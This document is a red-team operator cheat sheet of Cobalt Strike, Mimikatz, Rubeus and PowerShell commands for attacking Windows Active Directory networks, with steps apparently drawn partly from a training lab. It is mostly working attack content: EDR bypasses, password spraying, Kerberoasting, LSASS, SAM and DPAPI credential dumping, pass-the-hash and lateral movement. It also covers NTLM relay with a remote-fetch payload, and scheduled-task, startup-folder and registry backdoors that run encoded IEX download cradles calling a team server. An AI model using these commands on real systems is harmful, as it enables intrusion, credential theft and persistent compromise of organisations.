###### <font style="color:#00b3ff">Steps Part 1 </font> 

```
- Check system proxy
	- Check SSL inspection (test some ssl website and see ssl issuer)

	- Check share drives mounted at boot time
	- Enumerate network shares, check write access, check DC shares
	- Check AD logon scripts (scripts that executes when domain user log on, for example .bat)
		-> modify it for persistence or lateral movement
		
- Check for certificate .pfx files
		-> crack .pfx with sslkeycracker.sh
		-> crack the passphrase of private key .key with sslkeycracker.sh
		-> check expiry date of the certificate (in kali):
			-> openssl pkcs12 -in MyCertif.pfx -nokeys | openssl x509 -dates -purpose
		-> create fake website with the ssl certificate as PoC
```


###### <font style="color:#00b3ff">Steps Part 2 </font> 

```
- Bypass PowerShell EDR detection:
		-> Via manipulated .lnk file:
			-> test.lnk -exe byp -nop
		-> Via copy and renaming the binary powershell.exe to something else (ex: powersh1.exe)

- Local admin password brute-force (high noise):
		-> test.lnk -exe byp -nop -c "get-content Winwords | runas.ps1"

- Check ZeroLogon CVE:
		-> via GPO ALLOW_VULNERABLE_NETLOGON_SECURE_CHANNEL_DC

- Check for Azure AD (AAD) lateral movement ("Connect" Server, ADFS)
		-> check Microsoft On Line account (MSOL) (domain admin privileges)

- Outflank shovelNG (lateral movement) (Disable ESET on the host)
```


###### <font style="color:#00b3ff">Steps Part 3 </font> 

```
- Run certify.exe check for vulnerable template for low hanging fruit	

- Enumerate shadow copies on the machine with vssenum SA BOF

- Enumerate all SMB shares available on the Target information system (e.g., horizontal enumeration w/ SharpShares and vertical enumeration w/ SauronEye)	

- Identification of frequented SMB share (e.g., Target HR share) and either backdoor an existing DOCX document or plant a DOCX + template for lateral movement purposes

- Identification of frequented SMB share (e.g., Target HR share) and plant a malicious LNK masquerading an existing and frequented file/folder

- Upload LNK to target SMB share location
	Planting of coercive file on SMB share with Farmer (https://github.com/mdsecactivebreach/Farmer)

- Internal phishing using Email / MS Teams / Cisco Jabber to coerce users opening a malicious XLL attachment or opening it from a network share

- Domain password spraying with Spray-AD with empty password  or common password	

- Perform an ADIDNS dump (https://github.com/dirkjanm/adidnsdump) to get the list of DNS names and identify potential targets

- Look for credentials available on SMB share

- Look for GPP password

- Look for apps available on the network (e.g., Jira, Confluence) and associated vulns

- Target network printers (https://github.com/rvrsh3ll/SharpPrinter)

- Group policy abuse (https://github.com/Group3r/Group3r)

- LLMNR/mDNS/NBNS/DNS spoofer and man-in-the-middle with InveighZero (https://github.com/Kevin-Robertson/InveighZero)

- Logon to SQL Servers
```


---

###### <font style="color:#00b3ff">AD cmds</font> 

```
- https://wadcoms.github.io/#
```


###### <font style="color:#00b3ff">Commons persistence methods</font> 

```
-> HKCU / HKLM Registry Autoruns
-> Scheduled Tasks
-> Startup Folder
-> https://github.com/mandiant/SharPersist
```


###### <font style="color:#00b3ff">Check for privesc</font> 

```
-> https://github.com/GhostPack/SharpUp
```


###### <font style="color:#00b3ff">Domain Fronting</font> 

```
- https://www.redteam.cafe/red-team/domain-front/firebase-domain-front-hiding-c2-as-app-traffic
```

###### <font style="color:#00b3ff">Cobalt Strike Features</font> 

```
- Sync up downloads with other team members (View > Downloads > Sync)
```

###### <font style="color:#00b3ff">Kali Attacker Machine Terminal logging with timestamp</font> 

```
script -f >(while read;do date;echo "$REPLY";done >>session.log)
```


###### <font style="color:#00b3ff">Active Directory attack</font> 

```
- Kerberoast TGS:
	- cracks the passwd of the account that runs the associated SPNs

- Lateral Movements:
	- RDP / PSREMOTING / WINRM / PSEXEC 
	- depending on the SPN running on the targeted machine

- Hive Nightmare/Serious SAM:
	-> icacls \windows\system32\config\SAM
	-> invoke-imimi -command '"misc::shadowcopies"'
	-> invoke-imimi -command '"lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM"' 

	-> invoke-imimi -command '"lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SECURITY"'


- Verify the hash extracted
	-> Invoke-SMBclient -hash <NTLM_Hash> -domain myLaptop -username myUser -souce \\127.0.0.1\print$  -verbose

- PrintNightmare
	- check registry "point and print", "lua" set to 0x1, 0x2, 0x1

- AzureAD Cloud reco:
	-> SOCKS proxy with the beacon
	-> proxychains powershell:
		-> Connect-AzAccount -Credential $creds

- ShadowCoerce:
	- https://pentestlaboratories.com/2022/01/11/shadowcoerce/
```


###### <font style="color:#00b3ff">Cmds Cobalt Strike</font> 

```
- get userid
	-> getuid

- Get domain password policy:
	-> get_password_policy myDC.mydomain.com

- Copy file for persistence:
	-> cp c:\\users\\joe\\cryptbase.dll c:\\users\\joe\\appdata\\local\\microsoft\\teams\\current\\cryptbase.dll
```


###### <font style="color:#00b3ff">Run Rubeus</font> 

```
/!\ no need to upload the .exe files to the target (just keep them on Kali)

- Run Rubeus for Keberoasting:
	-> execute-assembly SharpFuscated_Rubeus.exe kerberoast /user:Administrator /rc4opsec /nowrap /spn:MSSQLSvc/blabla.mydomain.com:1433

- Run Rubeus for Keberoasting (target specific SPN):
	-> execute-assembly SharpFuscated_Rubeus.exe kerberoast /rc4opsec /nowrap

- Run Rubeus to look for AS-REP roasting:
	-> execute-assembly SharpFuscated_Rubeus.exe asreproast
```


###### <font style="color:#00b3ff">Run Seatbelt</font> 

```
- Run Seatbelt:
	-> execute-assembly /root/donet-tools/Seatbelt.exe DotNet

- Run Seatbelt (enumerate entire local group) (more noisy):
	-> execute-assembly /root/donet-tools/Seatbelt.exe -q group=system

- Run Seatbelt (enumerate user environment) :
	-> execute-assembly /root/donet-tools/Seatbelt.exe -q group=user

- Run Seatbelt (check RDP connections):
	-> execute-assembly /root/donet-tools/Seatbelt.exe RDPSavedConnections
```


###### <font style="color:#00b3ff">Run Certify</font> 

```
-> execute-assembly /root/Sharpfuscate_Certify.exe find /vulnerable

If templates found exploitable (with this new certificate it is then possible to ask a TGT) :
	-> execute-assembly /root/Sharpfuscate_Certify.exe request /ca:myDC.mydomain.com\mydomain /template:mytemplate /altname:myuser
```


###### <font style="color:#00b3ff">AD Enumeration</font> 

```
- Check specific logon script:
	-> ldapsearch (&(objectClass=user)(objectCategory=person)(scriptPath=MyCustomScript.bat)) name,description,cn,scriptPath

- Run SharpHound:
	-> execute-assembly /root/tool/SharpFuscated_SharpHound3.exe --CollectionMethod Trusts --Throttle 5000 --Jitter 50 --EncryptZip --RandomizeFilenames --NoSaveCache

	-> execute-assembly /root/tool/SharpFuscated_SharpHound3.exe --CollectionMethod ObjectProps --collectalproperties --throttle 5000 --Jitter 50 --EncryptZip --RandomizeFilenames --NoSaveCache


- Get info:
	-> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) servicePrincipalName,samAccountName,pwdLastSet,description

- List members of domain admin group:
	-> netGroupListMembers "Domain Admins"

- List Groups (to easily get shares path as well):
	-> netGroupList

- Windows Cmd: Launch Powershell version 2
	-> powershell -version 2
	-> $PSVersionTable

- Reboot laptop (/!\ running shell cmd can be detected by carbon black EDR):
	-> shell shutdown /r /t 0

- Password spraying (only once for less noise):
	-> Spray-AD MyPassword

- Network Shares (SMB) Enumeration (more noisy):
	-> execute-assembly /root/tool/SharpSharesOptions.exe /threads:5 /ldap:servers /ou:"OU=MyOU Servers,DC=mydomain.com.sg,DC=com,DC=sg"
```


###### <font style="color:#00b3ff">Process injection with DDL load (example process num 4681)</font> 

```
dllload 4681 mydll.dll
```

###### <font style="color:#00b3ff">Run Printnightmare Outflank exploit</font> 

```
execute-assembly /root/SharpPrintnighmare.exe \\192.168.x.x\mySmbFolder\myDLL.dll
```


###### <font style="color:#00b3ff">Run Mimikatz through beacon (preferably custom version compiled of Mimikatz) </font> 

```
mimikatz misc::shadowcopies
```


###### <font style="color:#00b3ff"> List files on a share</font> 

```
ls \\192.168.x.x\myShare
```


###### <font style="color:#00b3ff">Change registry value (to allow admin access to administrative shares)</font> 

```
shell reg add HKLM\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_WORD /d 1 /f
```

###### <font style="color:#00b3ff">Running password spraying in the AD (with empty password)</font> 

```
Spray-AD --empty-password
```

###### <font style="color:#00b3ff">Change beacon callback time (to 5s)</font> 

```
sleep 5
```

###### <font style="color:#00b3ff">Impersonate Token (and then rev2self)</font> 

```
-> make_token mydomain.com\myUser myUserPassword
-> rev2self
```

###### <font style="color:#00b3ff">Use a Kerberos ticket</font> 

```
-> keberos_ticket_use /root/documents/myticket.kirbi
-> run klist
```

###### <font style="color:#00b3ff">Spawn a session a remote target with a specified exploit (here psexec64)</font> 

```
jump psexec64 myHostName
```

###### <font style="color:#00b3ff">Run Printnightmare exploit (local Priv Esc) (use mimikatz .cna script)</font> 
```
mimikatz misc::printnightmare /server:localhost /library:C:\users\mydocuments\mylib.dll
```

###### <font style="color:#00b3ff">List Shares in AD</font> 
```
-> execute-assembly /root/dotnet-tools/SharpFuscated_SharpShares.exe /threads:5 /ldap:servers-exclude-dc /filter:sysvol,netlogon,ipc$,print$

-> execute-assembly /root/dotnet-tools/SharpFuscated_SharpShares.exe /threads:5 /ou:"OU=myOU,DC=myDomain,DC=Mydomain2part,DC=Mydomain3part" /filter:sysvol,netlogon,ipc$,print$
```

###### <font style="color:#00b3ff">Find process that has Lsass in memory, then dump it, get logon passwords</font> 
```
-> FindProcHandle lsass.exe
-> hashdump <the_found_pid> x64
-> logonpasswords <the_found_pid> x64
```

###### <font style="color:#00b3ff">Search for GPP Passwords</font> 
```
execute-assembly /home/kali/SharpFuscated_Net-GPPPassword_dotNET_v4.exe.exe MYDOMAIN.COM.SG
```

###### <font style="color:#00b3ff">Create schedule task</font> 
```
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'

PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly
```

###### <font style="color:#00b3ff">Add backdoor to startup folder</font> 
```
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -f "UserEnvSetup" -m add
```

###### <font style="color:#00b3ff">Add backdoor to Registry</font> 
```
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\beacon-http.exe
beacon> mv beacon-http.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```

###### <font style="color:#00b3ff">Show domain user</font> 
```
run net user bfarmer /domain
```

###### <font style="color:#00b3ff">Enumerate proxys</font> 
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe InternetSettings
```

###### <font style="color:#00b3ff">Listening for http requests</font> 
```
root@kali:~# tshark -i eth0 -f "tcp port 80" -O http -Y "http.request"
```

###### <font style="color:#00b3ff">List Windows services</font> 
```
-> C:\>sc query
-> PS C:\> Get-Service | fl
```

###### <font style="color:#00b3ff">Get list of services and their paths</font> 
```
beacon> run wmic service get name, pathname
```

###### <font style="color:#00b3ff">Check permissions with PowerShell of a directory</font> 
```
beacon> powershell Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```

###### <font style="color:#00b3ff">Find modifiable services</font> 
```
-> beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
-> beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1
-> beacon> powershell Get-ServiceAcl -Name Vuln-Service-2 | select -expandproperty Access
```

###### <font style="color:#00b3ff">Change service binary path</font> 
```
-> beacon> run sc qc Vuln-Service-2
-> beacon> run sc config Vuln-Service-2 binPath= C:\Temp\fake-service.exe
-> beacon> run sc qc Vuln-Service-2
-> beacon> run sc query Vuln-Service-2
-> beacon> run sc stop Vuln-Service-2
-> beacon> run sc start Vuln-Service-2
-> beacon> connect localhost 4444

```

###### <font style="color:#00b3ff">Resole Windows error codes (example 32)</font> 
```
C:\>net helpmsg 32
```

###### <font style="color:#00b3ff">Check binary with weak permissions (can be overwritten)</font> 
```
beacon> powershell Get-Acl -Path "C:\Program Files\Vuln Services\Service 3.exe" | fl
```

###### <font style="color:#00b3ff">Check for Always Install Elevated priv esc</font> 
```
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
```

###### <font style="color:#00b3ff">Install the malicious .msi</font> 
```
beacon> run msiexec /i BeaconInstaller.msi /q /n
```

###### <font style="color:#00b3ff">Check for UAC bypasses</font> 
```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe uac
```

###### <font style="color:#00b3ff">Bypass UAC with cobaltstrike (2 methods: elevate and runasadmin)</font> 
```
-> beacon> elevate uac-token-duplication tcp-4444-local
-> beacon> elevate svc-exe tcp-4444-local

-> beacon> runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

###### <font style="color:#00b3ff">List token privileges</font> 
```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe TokenPrivileges
```

###### <font style="color:#00b3ff">Use PowerView</font> 
```
-> beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
-> beacon> powershell Get-Domain  (specify -Domain if needed)
-> beacon> powershell Get-DomainController | select Forest, Name, OSVersion | fl
-> beacon> powershell Get-ForestDomain   (specify -Forest if needed)
-> beacon> powershell Get-DomainPolicyData | select -ExpandProperty SystemAccess
-> beacon> powershell Get-DomainUser -Identity nlamb -Properties DisplayName, MemberOf | fl
-> beacon> powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
-> beacon> powershell Get-DomainOU -Properties Name | sort -Property Name
-> beacon> powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
-> beacon> powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName

-> beacon> powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
-> beacon> powershell Get-DomainGPO -ComputerIdentity wkstn-1 -Properties DisplayName | sort -Property DisplayName
-> beacon> powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
-> beacon> powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
-> beacon> powershell Find-DomainUserLocation | select UserName, SessionFromName
-> beacon> powershell Get-NetSession -ComputerName dc-2 | select CName, UserName
-> beacon> powershell Get-DomainTrust
```

###### <font style="color:#00b3ff">Get domain info with SharpView</font> 
```
beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Debug\SharpView.exe Get-Domain
```

###### <font style="color:#00b3ff">Return all domain trusts for the current or specified domain</font> 
```
beacon> powershell Get-DomainTrust
```

###### <font style="color:#00b3ff">ADsearch, finding all domain groups that end in "Admins"</font> 
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
```

###### <font style="color:#00b3ff">Collect and Use SharpHound</font> 
```
beacon> execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c DcOnly -d cyberbotic.io
```

###### <font style="color:#00b3ff">Get all users that have a Service Principal Name (SPN) set</font> 
```
-> MATCH (u:User {hasspn:true}) RETURN u
```

###### <font style="color:#00b3ff">Get computers that are AllowedToDelegate to other computers</font> 
```
-> MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
```

###### <font style="color:#00b3ff">Shortest Paths from Kerberoastable Users, which will attempt to plot a path to Domain Admin from any user with an SPN</font> 
```
-> MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```

###### <font style="color:#00b3ff">Run SeatBelt on remote host</font> 
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe powershell -computername=srv-1
```

###### <font style="color:#00b3ff">Testing local admin access on remote host</font> 
```
beacon> ls \\srv-1\c$
```

###### <font style="color:#00b3ff">Lateral Movement techniques</font> 
```
-> beacon> jump
-> beacon> remote-exec
```

###### <font style="color:#00b3ff">WinRM on remote host (get OS architecture 32 for winrm and 64 winrm64)</font> 
```
beacon> remote-exec winrm srv-1 (Get-WmiObject Win32_OperatingSystem).OSArchitecture
```

###### <font style="color:#00b3ff">Create SMB beacon with winrm</font> 
```
beacon> jump winrm64 srv-1 smb
```

###### <font style="color:#00b3ff">Move laterally with psexec</font> 
```
beacon> jump psexec64 srv-1 smb
```

###### <font style="color:#00b3ff">Move laterally with WMI</font> 
```
-> beacon> cd \\srv-1\ADMIN$
-> beacon> upload C:\Payloads\beacon-smb.exe
-> beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
-> beacon> link srv-1
```

###### <font style="color:#00b3ff">Bypassing WMI beacon error (with SharpWMI)</font> 
```
beacon> make_token DEV\jking Purpl3Drag0n
beacon> remote-exec wmi srv-2 calc
beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Debug\SharpWMI.exe action=exec computername=srv-2 command="C:\Windows\System32\calc.exe"
```

###### <font style="color:#00b3ff">Lateral Mov. with  Distributed Component Object Model (DCOM) Powershell</font> 
```
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName srv-1 -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
beacon> link srv-1
```

###### <font style="color:#00b3ff">Show logged in users</font> 
```
beacon> net logons
```

###### <font style="color:#00b3ff">Mimikatz logon passwords</font> 
```
beacon> mimikatz sekurlsa::logonpasswords
```

###### <font style="color:#00b3ff">Dump keberos encryption keys</font> 
```
beacon> mimikatz sekurlsa::ekeys
```

###### <font style="color:#00b3ff">Dump SAM</font> 
```
beacon> mimikatz lsadump::sam
```

###### <font style="color:#00b3ff">Get Domain Cached Credentials (to crack)</font> 
```
beacon> mimikatz lsadump::cache
```

###### <font style="color:#00b3ff">Impersonating a user (with his password, only works for network connection)</font> 
```
beacon> make_token DEV\jking myPassword
```

###### <font style="color:#00b3ff">Inject into process with pid 3320</font> 
```
beacon> inject 3320 x64 tcp-4444-local
```

###### <font style="color:#00b3ff">Token impersonation (needs admin privs)</font> 
```
beacon> steal_token 3320
beacon> ls \\srv-2\c$
beacon> rev2self
```

###### <font style="color:#00b3ff">Spawn new process with user credentials (doesn't need admin or System)</font> 
```
beacon> spawnas DEV\jking Purpl3Drag0n tcp-4444-local
```

###### <font style="color:#00b3ff">Pass the hash</font> 
```
beacon> pth DEV\jking 4ffd3eabdce2e158d923ddec72de979e
beacon> ls \\srv-2\c$

beacon> mimikatz sekurlsa::pth /user:jking /domain:dev.cyberbotic.io /ntlm:4ffd3eabdce2e158d923ddec72de979e
beacon> steal_token 6284
beacon> rev2self
beacon> kill 6284
```

###### <font style="color:#00b3ff">OverPass The Hash (use NTLM or AES key to request TGT)</font> 
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /rc4:4ffd3eabdce2e158d923ddec72de979e /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec
```

###### <font style="color:#00b3ff">Create new logon session and transfer the TGT</font> 
```
beacon> make_token DEV\jking DummyPass

PS C:\> [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))

root@kali:~# echo -en "[...ticket...]" | base64 -d > jkingTGT.kirbi

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
beacon> ls \\srv-2\c$
```

###### <font style="color:#00b3ff">If you're in an elevated context, Rubeus can shorten some of these steps</font> 
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe

beacon> steal_token 3044
beacon> ls \\srv-2\c$
```

###### <font style="color:#00b3ff">Look for TGT in all logon session on the machine (if admin privs)</font> 
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /service:krbtgt /luid:0x462eb /nowrap
```

###### <font style="color:#00b3ff">Create a sacrificial logon session with createnetonly and take note of both the new LUID and ProcessID</font> 
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
```

###### <font style="color:#00b3ff">Now use ptt to pass the extracted TGT into the sacrificial logon session using the /luid flag</font> 
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
beacon> steal_token 4872
beacon> ls \\srv-2\c$
```

###### <font style="color:#00b3ff">Hashcat crack NTLM</font> 
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt
```

###### <font style="color:#00b3ff">Hashcat with a mask</font> 
```
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
```

###### <font style="color:#00b3ff">Hashcat combines two lists with rules</font> 
```
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt D:\Tools\list1.txt D:\Tools\list2.txt -j $- -k $!
```

###### <font style="color:#00b3ff">Generate key-walk passwords from adjacent keys</font> 
```
D:\Tools\kwprocessor>kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

###### <font style="color:#00b3ff">Spawn to a foreign Listener (here metasploit)</font> 
```
beacon> spawn metasploit
```

###### <font style="color:#00b3ff">Copy msf payload from kali to windows and execute it</font> 
```
C:\Payloads>pscp root@kali:/tmp/msf.bin .
beacon> execute C:\Windows\System32\notepad.exe
beacon> ps
beacon> shinject 1492 x64 C:\Payloads\msf.bin
```

###### <font style="color:#00b3ff">Start SOCKS proxy on port 1080</font> 
```
beacon> socks 1080
```

###### <font style="color:#00b3ff">Connect to a host through the proxy</font> 
```
root@kali:~# proxychains python3 /usr/local/bin/wmiexec.py DEV/bfarmer@10.10.17.25
```

###### <font style="color:#00b3ff">Run tools and authenticate to it in different ways</font> 
```
C:\>runas /netonly /user:DEV\nlamb "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"

mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:nlamb /domain:dev.cyberbotic.io /ntlm:2e8a408a8aec852ef2e458b938b8c071 /run:"C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
```

###### <font style="color:#00b3ff">Set the proxy in Metasploit</font> 
```
setg Proxies socks4:10.10.5.120:1080
```

###### <font style="color:#00b3ff">PowerShell script to listen on port 4444</font> 
```
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 4444)
$listener = New-Object System.Net.Sockets.TcpListener $endpoint
$listener.Start()
Write-Host "Listening on port 4444"
while ($true)
{
	 $client = $listener.AcceptTcpClient()
  	 Write-Host "A client has connected"
  	 $client.Close()
}
```

###### <font style="color:#00b3ff">Create a proxy server</font> 
```
C:\>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp

C:\>netsh interface portproxy show v4tov4
```

###### <font style="color:#00b3ff">Remove proxy server</font> 
```
C:\>netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

###### <font style="color:#00b3ff">Connect to a machine with Powershell</font> 
```
PS C:\> Test-NetConnection -ComputerName 10.10.17.71 -Port 4444
```

###### <font style="color:#00b3ff">Create port forwarding with beacon (forward to the Team Server)</font> 
```
beacon> rportfwd 8080 10.10.5.120 80
beacon> run netstat -anp tcp
```

###### <font style="color:#00b3ff">Connect to website with PowerShell</font> 
```
PS C:\> iwr -Uri http://10.10.17.231:8080/a
```

###### <font style="color:#00b3ff">Create port forwarding (forward to the CS client)</font> 
```
beacon> rportfwd_local 8080 127.0.0.1 8080
```

- NTLM relaying on CS with PortBender.cna

###### <font style="color:#00b3ff">Execute PortBender to redirect traffic from 445 to port 8445, forward to port 445 on Team server and relay it</font> 
```
beacon> PortBender redirect 445 8445
beacon> rportfwd 8445 127.0.0.1 445
beacon> socks 1080
root@kali:~# proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'
```


###### <font style="color:#00b3ff">List Credential Manager storages</font> 
```
beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials

beacon> run vaultcmd /listcreds:"Windows Credentials" /all

beacon> mimikatz vault::list
```

###### <font style="color:#00b3ff">Decrypt DPAPI credentials (provide master key location)</font> 
```
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7
```

###### <font style="color:#00b3ff">List master key location</font> 
```
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120
```

###### <font style="color:#00b3ff">Get master key content</font> 
```
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120\a23a1631-e2ca-4805-9f2f-fe8966fd8698 /rpc
```

###### <font style="color:#00b3ff">Use the key to decrypt credentials</font> 
```
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
```

###### <font style="color:#00b3ff">List and get Chrome credentials</font> 
```
beacon> ls C:\Users\bfarmer\AppData\Local\Google\Chrome\User Data\Default

beacon> execute-assembly C:\Tools\SharpChromium\bin\Debug\SharpChromium.exe logins
```

###### <font style="color:#00b3ff">Kerberoast with Rubeus (very noisy)</font> 
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap
```

###### <font style="color:#00b3ff">Kerberoasting in different steps. Find all users (in the current domain) where the ServicePrincipalName field is not blank</font> 
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"

	- Target a user:
		beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:svc_mssql /nowrap

	- Crack the TGS:
		root@kali:~# john --format=krb5tgs --wordlist=wordlist svc_mssql
```

###### <font style="color:#00b3ff">Look for AS-REP roasting accounts</font> 
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap

root@kali:~# john --format=krb5asrep --wordlist=wordlist svc_oracle
```

###### <font style="color:#00b3ff">Search for Unconstrained Delegation</font> 
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:nlamb /interval:10

beacon> make_token DEV\nlamb FakePass
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\nlamb.kirbi
beacon> ls \\dc-2\c$
```

###### <font style="color:#00b3ff">Printer Bug</font> 
```
On SRV-1:
	beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap

On WKSTN-1:
	beacon> execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-2 srv-1

